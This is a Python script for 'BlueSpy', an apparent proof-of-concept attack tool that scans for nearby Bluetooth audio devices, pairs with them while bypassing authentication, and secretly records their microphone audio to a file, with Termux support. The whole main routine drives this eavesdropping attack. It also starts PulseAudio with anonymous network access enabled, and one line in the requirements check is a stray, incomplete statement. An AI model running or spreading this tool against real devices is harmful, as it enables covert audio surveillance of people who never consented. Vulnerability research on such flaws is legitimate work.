#!/usr/bin/env python3

import os
import sys
import time
import argparse
import json
from interface import bcolors, color_print, log_info, log_warn, input_yn
from core import connect, BluezTarget, BluezAddressType, pair, record, playback

# Detect environment
IS_TERMUX = os.path.exists("/data/data/com.termux")
PREFIX = "/data/data/com.termux/files/usr" if IS_TERMUX else "/usr"

def check_requirements():
    """Check if all required tools are installed"""
    required_tools = ["bluetoothctl", "btmgmt", "pactl", "parecord", "paplay"]
    missing_tools = []
    
    for tool in required_tools:
        tool_path = os.path.join(PREFIX, f"bin/{tool}")
        if not os.path.exists(tool_path):
            missing_tools.append(tool)
    
    if missing_tools:
        log_warn(f"Missing required tools: {', '.join(missing_tools)}")
        if IS_TERMUX:
            log
            os.system("pkg update && pkg install -y pulseaudio bluez bluez-tools")
            return True
        return False
    return True

def main():
    # Cool banner
    color_print(bcolors.HEADER, "███╗   ███╗ █████╗ ███╗   ██╗██╗███████╗██╗  ██╗")
    color_print(bcolors.HEADER, "████╗ ████║██╔══██╗████╗  ██║██║██╔════╝██║  ██║")
    color_print(bcolors.HEADER, "██╔████╔██║███████║██╔██╗ ██║██║███████╗███████║")
    color_print(bcolors.HEADER, "██║╚██╔╝██║██╔══██║██║╚██╗██║██║╚════██║██╔══██║")
    color_print(bcolors.HEADER, "██║ ╚═╝ ██║██║  ██║██║ ╚████║██║███████║██║  ██║")
    color_print(bcolors.HEADER, "╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝")
    print(f"Bluetooth audio recording tool by {bcolors.HEADER}Manish Kumar{bcolors.ENDC}")
    
    if IS_TERMUX:
        print(f"{bcolors.OK_GREEN}Running in Termux environment{bcolors.ENDC}")
    
    # Check requirements first
    if not check_requirements():
        log_warn("Please install the required tools and try again")
        sys.exit(1)
    
    # Start pulseaudio if in Termux
    if IS_TERMUX:
        log_info("Starting PulseAudio service...")
        os.system("pulseaudio --start --load='module-native-protocol-tcp auth-anonymous=1'")
        time.sleep(2)

    # Parse command line arguments
    parser = argparse.ArgumentParser(
        prog="BlueSpy",
        description="Advanced Bluetooth audio recording tool with Termux support",
    )
    parser.add_argument(
        "-a",
        "--target-address",
        help="Target device MAC address",
        dest="address",
    )
    parser.add_argument(
        "-t",
        "--target-address-type",
        help="Target device MAC address type",
        dest="address_type",
        type=int,
        choices=[0, 1, 2],
        default=0,
    )
    parser.add_argument(
        "-f",
        "--file",
        help="File to store recorded audio",
        dest="outfile",
        default="recording.wav",
    )
    parser.add_argument(
        "-s",
        "--sink",
        help="Sink to play the audio back",
        dest="sink",
        default=None,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Show verbose output",
        dest="verbose",
        default=False,
        action='store_true'
    )
    parser.add_argument(
        "--scan",
        help="Scan for nearby Bluetooth devices before connecting",
        action='store_true'
    )
    args = parser.parse_args()

    # Set default sink based on environment
    if args.sink is None:
        args.sink = "default" if IS_TERMUX else "alsa_output.pci-0000_00_05.0.analog-stereo"

    # Scan for devices if requested
    if args.scan:
        log_info("Scanning for Bluetooth devices...")
        os.system(f"{PREFIX}/bin/bluetoothctl scan on &")
        time.sleep(5)
        scan_result = os.popen(f"{PREFIX}/bin/bluetoothctl devices").read()
        print("\nAvailable devices:")
        for line in scan_result.splitlines():
            if "Device" in line:
                print(line)
        os.system(f"{PREFIX}/bin/bluetoothctl scan off")
        
        if not args.address:
            addr = input("\nEnter device address from the list above: ")
            if addr:
                args.address = addr

    # Check if address is provided
    if not args.address:
        log_warn("Target device address is required")
        parser.print_help()
        sys.exit(1)

    try:
        # Convert args to target
        address_type = BluezAddressType(args.address_type)
        target = BluezTarget(args.address, address_type)
        
        # Run the PoC!
        log_info(f"Avoiding authentication with {args.address}...")
        log_info(f"Generating shared key...")
        paired = pair(target, verbose=args.verbose)
        if not paired:
            log_warn(f"Authentication error while trying to pair")
            log_warn(f"The device probably is not vulnerable...")
            return
        log_warn(f"Key generated")
        log_info(f"The device is vulnerable!")

        time.sleep(1)

        log_info(f"Establishing connection...")
        connect(target, verbose=args.verbose)
        time.sleep(3)

        log_info(f"Starting audio recording...")
        log_warn(f"Recording! Press Ctrl+C to stop recording")
        try:
            record(target, outfile=args.outfile, verbose=args.verbose)
        except KeyboardInterrupt:
            log_info(f"Recording stopped by user")

        log_warn(f"Recording stored in \"{args.outfile}\"")
        play_back = input_yn("Play audio back?")
        if play_back:
            playback(args.sink, args.outfile, verbose=args.verbose)
        log_info(f"Exiting")
        
    except ValueError as e:
        log_warn(f"Error: {str(e)}")
        log_warn("Please provide a valid Bluetooth address (format: XX:XX:XX:XX:XX:XX)")
        sys.exit(1)
    except Exception as e:
        log_warn(f"Error: {str(e)}")
        log_info(f"Make sure all required tools are installed:")
        log_info(f"bluetoothctl, btmgmt, pactl, parecord, paplay")
        sys.exit(1)


if __name__ == "__main__":
    main()
